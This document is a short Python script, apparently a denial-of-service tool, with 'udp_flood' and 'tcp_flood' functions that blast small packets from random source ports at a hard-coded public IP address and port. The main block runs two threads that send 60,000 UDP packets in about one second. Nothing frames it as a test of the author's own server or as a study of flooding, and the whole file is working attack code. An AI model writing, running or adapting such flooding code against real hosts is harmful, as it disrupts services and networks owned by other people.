import socket
import random
import time
import threading

def generate_random_port():
    return random.randint(1024, 65535)

def udp_flood(dst_ip, dst_port, packet_count, send_time):
    gap = send_time / packet_count
    for _ in range(packet_count):
        src_port = generate_random_port()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', src_port))  
        sock.sendto(b"X" * 36, (dst_ip, dst_port))
        print(f"Sent packet from port {src_port} to {dst_ip}:{dst_port}")
        sock.close()  
        time.sleep(gap)

def tcp_flood(dst_ip, dst_port, packet_count, send_time):
    gap = send_time / packet_count
    for _ in range(packet_count):
        src_port = generate_random_port()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        sock.bind(('', src_port))  
        sock.connect((dst_ip, dst_port))  
        sock.send(b"X" * 36)
        print(f"Sent packet from port {src_port} to {dst_ip}:{dst_port}")
        sock.close()  
        time.sleep(gap)

if __name__ == "__main__":
    dst_ip = "47.96.121.125"  
    dst_port = 11111  
    packet_count = 60000  
    send_time = 1  

    thread_count = 2
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=udp_flood, args=(dst_ip, dst_port, packet_count // thread_count, send_time))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()